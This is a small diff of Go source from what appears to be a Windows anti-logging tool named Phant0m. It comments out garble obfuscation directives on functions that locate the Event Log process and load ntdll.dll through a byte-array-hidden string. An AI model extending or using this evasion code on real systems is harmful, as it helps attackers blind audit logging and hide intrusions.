@@ -20,7 +20,7 @@ type SC_SERVICE_TAG_QUERY struct {
 	pBuffer    *byte
 }
 
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func GetEventLogPid() (int, error) {
 	advapi32 := windows.NewLazyDLL("advapi32.dll")
 
@@ -47,7 +47,7 @@ func GetEventLogPid() (int, error) {
 }
 
 // Main function
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func Phant0m(eventlog_pid int) error {
 
 	ntdll := windows.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
